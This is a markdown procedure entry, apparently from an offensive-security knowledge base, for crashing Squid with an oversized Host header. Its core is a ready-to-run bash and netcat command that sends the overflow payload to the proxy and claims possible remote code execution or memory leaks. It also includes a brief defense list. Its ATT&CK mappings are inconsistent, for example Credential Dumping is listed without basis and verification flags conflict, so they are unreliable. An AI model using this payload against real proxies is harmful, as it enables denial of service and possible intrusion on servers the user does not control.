---
id: proc-trigger-squid-overflow-2023
tags:
  - exploit
  - buffer-overflow
  - rce
  - dos
type: procedure
tools:
  - '[[tools/nc]]'
  - '[[tools/echo]]'
  - '[[tools/sleep]]'
tactics:
  - '[[Execution]]'
  - '[[Privilege Escalation]]'
  - '[[Collection]]'
commands:
  - '[[commands/launch-squid-and-exploit]]'
verified: false
platforms:
  - Linux
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Endpoint Denial of Service]]'
  - '[[Credential Dumping]]'
updated_at: '2025-12-14T17:23:33.000Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
  - '[[Privilege Escalation]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Endpoint Denial of Service]]'
  - '[[Credential Dumping]]'
---
# Trigger-Squid-Host-Header-Buffer-Overflow

## Summary

This procedure launches Squid in reverse proxy mode and sends a crafted HTTP request with an excessively long Host header to trigger the stack buffer overflow, resulting in DoS, potential RCE, or data leak.

## Description

The overflow occurs in Squid's Host parsing due to unbounded string copy from subtraction overflow. On vulnerable builds (no stack protector, musl libc), this can lead to RCE; generally causes crash. The payload uses ~500 'x' characters followed by ':'. Targets localhost:9999 after startup delay.

## Requirements

1. Built and configured Squid in local sbin
2. Netcat (nc) for sending requests
3. Local network loopback access

## Defense

Defensive measures and detection strategies:

- Patch Squid to version >4.8 or apply upstream fixes
- Enable stack canaries and ASLR
- Monitor HTTP logs for oversized Host headers (>256 chars)
- Use IDS to detect crafted requests to proxies

## Objectives

1. Cause Squid crash via buffer overflow for DoS
2. Achieve RCE on unprotected systems
3. Leak uninitialized memory for info disclosure

## Instructions

### Step 1: Launch Squid and Send Payload

**Context**: Starts Squid in foreground, backgrounds it, waits for bind, then pipes oversized Host request via netcat.

**Command** ([[commands/launch-squid-and-exploit]]):
```bash
./squid -N -f squid.conf & sleep 1 && echo -en "GET / HTTP/1.1\x0D\x0AHost: xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:\x0D\x0A\x0D\x0A" | nc localhost 9999
```

> Runs Squid non-daemonized, sends payload. Expected output: "*** buffer overflow detected ***: ./squid terminated" and core dump; possible memory leak in response.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution
- [[Privilege Escalation]] Impact
- [[Collection]] Collection

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Endpoint Denial of Service]] Endpoint Denial of Service
- [[Credential Dumping]] OS Credential Dumping

### Sub-Techniques


## Commands Used

- [[commands/launch-squid-and-exploit]]

## Tools Used

- [[tools/nc]]
- [[tools/echo]]
- [[tools/sleep]]

## Tags

- exploit
- buffer-overflow
- rce
- dos
